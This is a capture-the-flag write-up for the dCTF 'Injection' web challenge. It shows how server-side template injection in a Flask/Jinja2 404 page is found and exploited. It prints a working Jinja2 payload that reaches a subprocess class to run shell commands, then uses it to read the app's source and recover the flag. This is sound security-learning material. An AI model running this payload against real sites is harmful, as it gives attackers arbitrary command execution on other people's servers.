# Injection

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/

![Pasted image 20210516170501](https://user-images.githubusercontent.com/70921512/118423622-d387a380-b69b-11eb-95e3-50008df586c3.png)

There is an admin login with the parameters "User", "Password" and a hidden "Submit".

Inputting anything into these won't work, and we'll be redirected to `/login` where we get the message:

`Oops! Page login doesn't exist :(`

I really didn't know how to work this one out. I tried looking at the robots.txt, other known directories, the root directory where the image is stored, but nothing.

Eventually, I figured the website was responding to anything that I was throwing at it through the 404 response page, even xss:

![Pasted image 20210516170833](https://user-images.githubusercontent.com/70921512/118423632-da161b00-b69b-11eb-9827-b4165a4be012.png)

But eh, couldn't figure it out for a while. I initially thought it was SQLi, and was put off by it because I know barely any SQLi.

After googling a bit more I found some CTF writeups that had something similar, and eventually landed on the `SSTI` keyword...

Stupidly enough I had already read about SSTIs prior to this, but I couldn't make the connection earlier.

# Solution
So we try:
`http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/{{1+1}}` 
and we get

`Oops! Page 2 doesn't exist :(`

Nice.

`{{config}}` gives us a bunch of data, among it:

` 'MESSAGE': 'You are getting closer!`

After that it becomes trivial, and we just have to find a way to get terminal access. We eventually land on:

`{{''.__class__.__mro__[1].__subclasses__()[414]('COMMAND',shell=True,stdout=-1).communicate()}}` << where COMMAND is our command.

Running `ls`:
`app.py
lib
static
templates`

Running `ls lib`:
`security.py`

Running `cat lib/security.py`

`import base64


def validate_login(username, password):
 if username != 'admin':
 return False
 valid_password = 'QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ'
 return base64.b64encode(password.encode('ascii')).decode('ascii')[::-1].lstrip('=') == valid_password`
 
 So we just get the password encoded in a backwards b64, just flip it and decode it:
 
```
base64.b64decode(password[::-1]+"==")
b'dctf{4ll_us3r_1nput_1s_3v1l}'
```

And we get the flag :D

# Notes:

Sometimes, the environment will be vary a lot. Most of the payloads I tried that I found online wouldn't work, so I had to craft my own. To make it, I used this medium article that was AMAZING:

https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee


#----------
`{{''.__class__.__mro__[1].__subclasses__()[414]('COMMAND',shell=True,stdout=-1).communicate()}}`
